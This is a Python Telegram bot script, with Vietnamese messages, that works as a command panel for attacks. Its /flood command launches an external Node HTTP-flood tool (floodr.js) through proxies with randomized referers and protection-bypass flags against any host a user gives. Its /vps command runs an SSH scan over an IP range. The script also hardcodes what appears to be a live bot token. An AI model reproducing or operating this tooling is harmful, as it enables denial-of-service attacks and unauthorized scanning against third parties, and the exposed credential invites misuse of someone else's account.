import telebot
import subprocess
import os
import time

BOT_TOKEN = "8117259415:AAFLC0_9GYp0LHwEOhOSfIgwKFncYJzY2nQ"
bot = telebot.TeleBot(BOT_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.send_message(message.chat.id, "🤖 Bot đã sẵn sàng.\nSử dụng lệnh:\n/update - để cập nhật proxy\n/vps - để scan datacenter IP\n/flood <host> <port> <time> - để tấn công")

@bot.message_handler(commands=['update'])
def handle_update(message):
    subprocess.Popen(["python3", "2.py"])
    bot.send_message(message.chat.id, "🔁 Đang cập nhật proxy và khởi động lại bot 2.py...")

@bot.message_handler(commands=['vps'])
def handle_vps_scan(message):
    bot.send_message(message.chat.id, "🔍 Đang scan VPS...")
    subprocess.Popen(["python3", "ssh.py", "--cidr", "192.168.0.0/16"])

@bot.message_handler(commands=['flood'])
def handle_flood(message):
    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "❗ Dùng đúng định dạng: /flood <host> <port> <time>")
        return
    host, port, duration = args[1], args[2], int(args[3])
    bot.send_message(message.chat.id, f"🚀 Đang tấn công!\n🌐 Url: {host}\n🔌 Port: {port}\n⏱ Time: {duration}s")
    command = ["node", "floodr.js", "GET", f"{host}", str(duration), "245", "90", "http.txt", "--query", "1", "--delay 1", "--full", "--http", "mix", "--bfm true", "--referer", "rand", "--randrate"]
    subprocess.Popen(command)
    time.sleep(duration)
    bot.send_message(message.chat.id, f"✅ Tấn công đã kết thúc với: {host}:{port} trong {duration}s")

bot.polling()
